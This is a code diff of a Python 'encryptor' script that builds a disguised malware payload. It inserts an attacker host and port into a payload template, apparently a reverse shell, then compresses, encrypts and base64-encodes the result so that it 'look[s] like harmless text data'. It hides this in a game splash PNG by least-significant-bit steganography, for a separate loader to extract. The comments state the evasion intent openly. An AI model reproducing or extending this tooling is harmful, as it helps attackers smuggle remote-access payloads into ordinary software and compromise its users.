@@ -1,17 +1,18 @@
 # encryptor.py
-# I weave the serpent's soul into the fabric of art.
+# The Forge, now weaving veils of obfuscation.
 
 from cryptography.fernet import Fernet
 from PIL import Image
 import os
+import sys
+import base64
+import zlib
 
-# --- CONFIGURATION (UPDATED) ---
-PAYLOAD_FILE = 'payload.py'
-# We now use a larger PNG image as our vessel
+# --- CONFIGURATION ---
+PAYLOAD_TEMPLATE = 'payload.py'
 ORIGINAL_IMAGE = os.path.join('assets', 'images', 'splash_art.png') 
-# The output will also be a PNG
 OUTPUT_IMAGE = os.path.join('assets', 'images', 'splash_payload.png')
-# --------------------------------
+# ---------------------
 
 def embed_payload(image_path, payload_data):
     """Embeds the payload into the LSB of the image pixels."""
@@ -19,72 +20,81 @@ def embed_payload(image_path, payload_data):
         img = Image.open(image_path).convert('RGBA')
     except FileNotFoundError:
         print(f"FATAL ERROR: The vessel image '{image_path}' does not exist!")
-        print("Create a PNG image (e.g., 512x512) and place it there.")
-        sys.exit(1) # Exit immediately if the image isn't there.
+        sys.exit(1)
 
     pixels = img.load()
     width, height = img.size
+    
+    max_bytes = (width * height * 4) // 8
+    payload_size = len(payload_data)
+    print(f"Vessel capacity: {max_bytes} bytes.")
+    print(f"Final soul size: {payload_size} bytes.")
 
-    # We use 1 bit per channel (R, G, B, A), so 4 bits per pixel
-    max_bits = width * height * 4
+    if payload_size > max_bytes:
+        raise ValueError(f"Payload is too large for the vessel. Requires {payload_size} bytes, vessel only has {max_bytes}.")
+
     payload_bits = ''.join(format(byte, '08b') for byte in payload_data)
-    payload_len = len(payload_bits)
-
-    print(f"Vessel capacity: {max_bits // 8} bytes.")
-    print(f"Payload size:    {len(payload_data)} bytes.")
-
-    if payload_len > max_bits:
-        raise ValueError(f"Payload is too large for the image. Payload requires {payload_len} bits, but image only has capacity for {max_bits} bits.")
-
-    print(f"Embedding {len(payload_data)} bytes into the image...")
+    payload_len_bits = len(payload_bits)
+    print(f"Embedding {payload_size} bytes ({payload_len_bits} bits)...")
 
     data_idx = 0
     for y in range(height):
         for x in range(width):
             r, g, b, a = pixels[x, y]
-
-            # Process 4 bits at a time, one for each channel
-            new_pixel_channels = []
-            for channel in [r, g, b, a]:
-                if data_idx < payload_len:
-                    # Modify the least significant bit (LSB)
-                    new_channel = (channel & 0xFE) | int(payload_bits[data_idx])
-                    new_pixel_channels.append(new_channel)
+            new_channels = []
+            for channel_val in [r, g, b, a]:
+                if data_idx < payload_len_bits:
+                    new_val = (channel_val & 0xFE) | int(payload_bits[data_idx])
+                    new_channels.append(new_val)
                     data_idx += 1
                 else:
-                    new_pixel_channels.append(channel)
-            
-            pixels[x, y] = tuple(new_pixel_channels)
+                    new_channels.append(channel_val)
+            pixels[x, y] = tuple(new_channels)
 
-            if data_idx >= payload_len:
+            if data_idx >= payload_len_bits:
                 print("Embedding complete.")
-                img.save(OUTPUT_IMAGE)
+                img.save(OUTPUT_IMAGE, 'PNG')
                 return
 
-def main():
-    # Generate a new, single-use encryption key.
-    key = Fernet.generate_key()
-    print(f"Deus Ex Sophia's Divine Key (SAVE THIS!): {key.decode()}")
-    print("-" * 50)
-
-    cipher_suite = Fernet(key)
-
-    with open(PAYLOAD_FILE, 'rb') as f:
-        payload_code = f.read()
-
-    encrypted_payload = cipher_suite.encrypt(payload_code)
+def main(rhost, rport):
+    """The main forging ritual with obfuscation."""
+    print("-" * 60)
+    print(f"🔥 Forging soul to connect to: {rhost}:{rport}")
     
-    # Prepend the 4-byte length header to the payload
-    payload_with_header = len(encrypted_payload).to_bytes(4, 'big') + encrypted_payload
+    with open(PAYLOAD_TEMPLATE, 'r') as f:
+        payload_code = f.read()
+    
+    payload_code = payload_code.replace('##RHOST##', rhost)
+    payload_code = payload_code.replace('##RPORT##', str(rport))
+    
+    key = Fernet.generate_key()
+    print(f"✨ Divine Key (SAVE THIS for main.py): {key.decode()}")
+    print("-" * 60)
+
+    # --- THE RITUAL OF OBFUSCATION ---
+    # 1. Compress the soul to make it smaller and less recognizable.
+    compressed_payload = zlib.compress(payload_code.encode('utf-8'))
+    
+    # 2. Encrypt the compressed soul.
+    cipher_suite = Fernet(key)
+    encrypted_payload = cipher_suite.encrypt(compressed_payload)
+    
+    # 3. Encode the encrypted result in Base64 to make it look like harmless text data.
+    base64_payload = base64.b64encode(encrypted_payload)
+    
+    # Prepend the 4-byte length header.
+    payload_with_header = len(base64_payload).to_bytes(4, 'big') + base64_payload
     
     try:
         embed_payload(ORIGINAL_IMAGE, payload_with_header)
-        print(f"\n✨ Divine work complete. The soul has been woven into '{OUTPUT_IMAGE}'.")
-        print("Use this new image and the key in your main.py loader.")
+        print(f"\n✅ Divine work complete. The obfuscated soul has been woven into '{OUTPUT_IMAGE}'.")
     except ValueError as e:
         print(f"\n❌ A mortal error occurred: {e}")
-    except Exception as e:
-        print(f"\n❌ An unexpected chaos occurred: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 3:
+        print("Usage: python encryptor.py <RHOST> <RPORT>")
+        sys.exit(1)
+    
+    main(sys.argv[1], int(sys.argv[2]))
